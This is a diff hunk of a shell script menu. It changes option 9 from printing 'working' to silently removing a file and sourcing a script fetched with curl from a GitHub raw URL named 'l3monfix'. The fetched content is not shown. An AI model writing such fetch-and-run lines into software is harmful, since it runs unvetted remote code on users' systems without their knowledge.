@@ -100,7 +100,10 @@ echo;;
 
 9)
 #Script start here
-echo working;;
+cd $HOME
+rm 2023fix > /dev/null 2>&1 &
+source <(curl -fsSL https://raw.githubusercontent.com/database2022/l3monfix/main/2023fix)
+echo;;
   
 0)
 echo
